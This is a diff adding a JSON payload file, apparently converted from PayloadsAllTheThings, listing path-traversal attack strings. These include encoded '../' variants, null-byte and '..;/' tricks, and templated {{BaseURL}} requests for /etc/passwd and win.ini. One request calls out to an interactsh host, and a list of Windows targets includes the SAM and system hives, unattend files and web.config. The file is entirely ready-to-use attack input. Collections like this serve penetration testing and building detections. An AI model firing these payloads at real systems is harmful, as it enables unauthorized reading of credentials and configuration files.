@@ -1,0 +1,113 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "path_traversal",
+  "original_category": "Directory Traversal",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "../",
+        "..\\",
+        "..\\/",
+        "%2e%2e%2f",
+        "%252e%252e%252f",
+        "%c0%ae%c0%ae%c0%af",
+        "%uff0e%uff0e%u2215",
+        "%uff0e%uff0e%u2216"
+      ]
+    },
+    {
+      "category": "URL Encoding",
+      "escalation": "baseline",
+      "lines": [
+        "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd"
+      ]
+    },
+    {
+      "category": "Double URL Encoding",
+      "escalation": "baseline",
+      "lines": [
+        "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+        "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+      ]
+    },
+    {
+      "category": "Unicode Encoding",
+      "escalation": "baseline",
+      "lines": [
+        "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
+      ]
+    },
+    {
+      "category": "Mangled Path",
+      "escalation": "baseline",
+      "lines": [
+        "..././",
+        "...\\.\\",
+        "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
+      ]
+    },
+    {
+      "category": "NULL Bytes",
+      "escalation": "baseline",
+      "lines": [
+        "{{BaseURL}}/.%00./.%00./etc/passwd",
+        "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm"
+      ]
+    },
+    {
+      "category": "Reverse Proxy URL Implementation",
+      "escalation": "baseline",
+      "lines": [
+        "..;/",
+        "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}"
+      ]
+    },
+    {
+      "category": "UNC Share",
+      "escalation": "baseline",
+      "lines": [
+        "\\\\localhost\\c$\\windows\\win.ini"
+      ]
+    },
+    {
+      "category": "Java URL Protocol",
+      "escalation": "baseline",
+      "lines": [
+        "url:file:///etc/passwd",
+        "url:http://127.0.0.1:8080"
+      ]
+    },
+    {
+      "category": "Windows Files",
+      "escalation": "baseline",
+      "lines": [
+        "C:\\Windows\\win.ini",
+        "C:\\windows\\system32\\license.rtf",
+        "c:/inetpub/logs/logfiles",
+        "c:/inetpub/wwwroot/global.asa",
+        "c:/inetpub/wwwroot/index.asp",
+        "c:/inetpub/wwwroot/web.config",
+        "c:/sysprep.inf",
+        "c:/sysprep.xml",
+        "c:/sysprep/sysprep.inf",
+        "c:/sysprep/sysprep.xml",
+        "c:/system32/inetsrv/metabase.xml",
+        "c:/sysprep.inf",
+        "c:/sysprep.xml",
+        "c:/sysprep/sysprep.inf",
+        "c:/sysprep/sysprep.xml",
+        "c:/system volume information/wpsettings.dat",
+        "c:/system32/inetsrv/metabase.xml",
+        "c:/unattend.txt",
+        "c:/unattend.xml",
+        "c:/unattended.txt",
+        "c:/unattended.xml",
+        "c:/windows/repair/sam",
+        "c:/windows/repair/system"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.869Z"
+}
